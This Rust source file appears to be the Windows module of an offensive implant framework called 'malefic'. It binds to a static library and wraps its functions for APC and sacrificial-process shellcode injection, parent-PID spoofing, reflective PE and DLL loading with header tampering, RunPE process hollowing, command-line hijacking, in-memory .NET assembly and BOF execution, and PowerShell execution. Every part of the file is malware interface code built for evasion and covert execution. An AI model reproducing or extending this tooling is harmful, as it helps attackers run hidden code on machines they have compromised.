pub mod utils;
pub mod pe;
pub mod clr;
pub mod pwsh;
pub mod bof;
pub mod bypass;
pub mod func;

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
#[link(name = "malefic_win_kit", kind = "static")]
extern "C" {
    pub fn ApcLoaderInline(bin: *const u8, bin_len: usize) -> *const u8;
    pub fn ApcLoaderSacriface(
        bin: *const u8,
        bin_len: usize,
        sacrifice_commandline: *mut i8,
        ppid: u32,
        block_dll: bool,
    ) -> *const u8;
    pub fn MaleficLoadLibrary(
        flags: u32,
        buffer: winapi::shared::ntdef::LPCWSTR,
        file_buffer: *const core::ffi::c_void,
        len: usize,
        name: *const u8,
    ) -> *const core::ffi::c_void;
    pub fn MaleficGetFuncAddrWithModuleBaseDefault(
        module_base: *const core::ffi::c_void,
        func_name: *const u8,
        func_name_len: usize,
    ) -> *const core::ffi::c_void;
    pub fn InlinePE(
        bin: *const u8,
        bin_size: usize,
        magic: *const u16,
        signature: *const u32,
        commandline: *const u8,
        commandline_len: usize,
        entrypoint: *const u8,
        entrypoint_len: usize,
        is_dll: bool,
        is_need_output: bool,
        timeout: u32
    ) -> *const u8;
    pub fn RunPE(
        start_commandline: *const u8,
        start_commandline_len: usize,
        hijack_commandline: *const u8,
        hijack_commandline_len: usize,
        data: *const u8,
        data_size: usize,
        entrypoint: *const u8,
        entrypoint_len: usize,
        is_x86: bool,
        pid: u32,
        block_dll: bool,
        need_output: bool
    ) -> *const u8;
    pub fn RunSacrifice(
        application_name: *mut u8,
        start_commandline: *const u8,
        start_commandline_len: usize,
        hijack_commandline: *const u8,
        hijack_commandline_len: usize,
        parent_id: u32,
        need_output: bool,
        block_dll: bool
    ) -> *const u8;
    pub fn MaleficExecAssembleInMemory(
        data: *const u8,
        data_len: usize,
        args: *const *const u8,
        args_len: usize,
    ) -> *const u8;
    pub fn MaleficBofLoader(
        buffer: *const u8,
        buffer_len: usize,
        arguments: *const *const u8,
        arguments_size: usize,
        entrypoint_name: *const u8,
    ) -> *const u8;
    pub fn HijackCommandLine(
        commandline: *const u8, 
        commandline_len: usize
    ) -> u8;
    pub fn MaleficPwshExecCommand(command: *const u8, command_len: usize) -> *const u8;
    pub fn PELoader(
        handle: *const core::ffi::c_void,
        base_addr: *const core::ffi::c_void,
        size: usize,
        need_modify_magic: bool,
        need_modify_sign: bool,
        magic: u16,
        signature: u32
    ) -> *const core::ffi::c_void;
    pub fn UnloadPE(module: *const core::ffi::c_void);

    pub fn MExitThread(code: i32);
    pub fn MCloseHandle(handle: *const core::ffi::c_void);
    pub fn MSetEvent(handle: *const core::ffi::c_void);
    pub fn MWaitForSingleObject(handle: *const core::ffi::c_void, overtime: u32);
    pub fn MCreateThread(
        lpThreadAttributes: *mut core::ffi::c_void,
        dwStackSize: u32,
        lpStartAddress: *mut core::ffi::c_void,
        lpParameter: *mut core::ffi::c_void,
        dwCreationFlags: u32,
        lpThreadId: *mut u32
    ) -> *const core::ffi::c_void;
    pub fn MCreateEventA(
        lpEventAttributes: *const core::ffi::c_void,
        bManualReset: i32,
        bInitialState: i32,
        lpName: *const u8,
    ) -> *const core::ffi::c_void;
    pub fn SleepEx(dwMilliseconds: u32, bAlertable: bool) -> u32;
    pub fn MaleficMakePipe(read: *mut *mut core::ffi::c_void, write: *mut *mut core::ffi::c_void) -> bool;
    pub fn MaleficPipeRedirectStdOut(write: *mut core::ffi::c_void) -> *const core::ffi::c_void;
    pub fn MaleficPipeRepairedStdOut(stdout: *const core::ffi::c_void);
    pub fn MaleficPipeRead(read_pipe: *mut core::ffi::c_void) -> *const u8;
    pub fn SafeFreePipeData(data: *const u8);
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub struct MaleficPipe {
    read: *const core::ffi::c_void,
    write: *const core::ffi::c_void,
}


#[cfg(target_os = "windows")]
pub struct MaleficModule {
    pub new_module: *mut core::ffi::c_void,
    pub entry_point: *const core::ffi::c_void, 
}


#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub struct DarkModule {
    pub module_base: *const core::ffi::c_void,
    pub is_successed: bool,
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub const LOAD_MEMORY: u16 = 0x02u16;
#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub const AUTO_RUN_DLL_MAIN: u32 = 0x00010000u32;

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn pe_loader(
    handle: *const core::ffi::c_void,
    base_addr: *const core::ffi::c_void,
    size: usize,
    need_modify_magic: bool,
    need_modify_sign: bool,
    magic: u16,
    signature: u32,
) -> *const core::ffi::c_void {
    unsafe {
        PELoader(handle, base_addr, size, need_modify_magic, need_modify_sign, magic, signature)
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn unload_pe(
    module: *const core::ffi::c_void,
) {
    unsafe {
        UnloadPE(module)
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn load_library(
    flags: u32,
    buffer: winapi::shared::ntdef::LPCWSTR,
    file_buffer: *const core::ffi::c_void,
    len: usize,
    name: *const u8,
) -> *const core::ffi::c_void {
    unsafe { MaleficLoadLibrary(flags, buffer, file_buffer, len, name) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn run_pe(
    start_commandline: *const u8,
    start_commandline_len: usize,
    hijack_commandline: *const u8,
    hijack_commandline_len: usize,
    data: *const u8,
    data_size: usize,
    entrypoint: *const u8,
    entrypoint_len: usize,
    is_x86: bool,
    pid: u32,
    block_dll: bool,
    need_output: bool
) -> *const u8 {
    unsafe { RunPE(start_commandline, start_commandline_len, hijack_commandline, hijack_commandline_len, data, data_size, entrypoint, entrypoint_len, is_x86, pid, block_dll, need_output) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn inline_pe(
    bin: *const u8,
    bin_size: usize,
    magic: *const u16,
    signature: *const u32,
    commandline: *const u8,
    commandline_len: usize,
    entrypoint: *const u8,
    entrypoint_len: usize,
    is_dll: bool,
    is_need_output: bool,
    timeout: u32
) -> *const u8 {
    unsafe { InlinePE(bin, bin_size, magic, signature, commandline, commandline_len, entrypoint, entrypoint_len, is_dll, is_need_output, timeout) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn hijack_commandline(commandline: *const u8, commandline_len: usize) -> bool {
    unsafe { HijackCommandLine(commandline, commandline_len).ne(&0) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn exec_assemble_in_memory(
    data: *const u8,
    data_len: usize,
    args: *const *const u8,
    args_len: usize,
) -> *const u8 {
    unsafe { MaleficExecAssembleInMemory(data, data_len, args, args_len) }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn bof_loader(
    buffer: *const u8,
    buffer_len: usize,
    arguments: *const *const u8,
    arguments_len: usize,
    entrypoint_name: *const u8,
) -> *const u8 {
    unsafe {
        MaleficBofLoader(
            buffer,
            buffer_len,
            arguments,
            arguments_len,
            entrypoint_name,
        )
    }
}

#[cfg(target_os = "windows")]
#[cfg(feature = "prebuild")]
pub fn pwsh_exec_command(command: *const u8, command_len: usize) -> *const u8 {
    unsafe { MaleficPwshExecCommand(command, command_len) }
}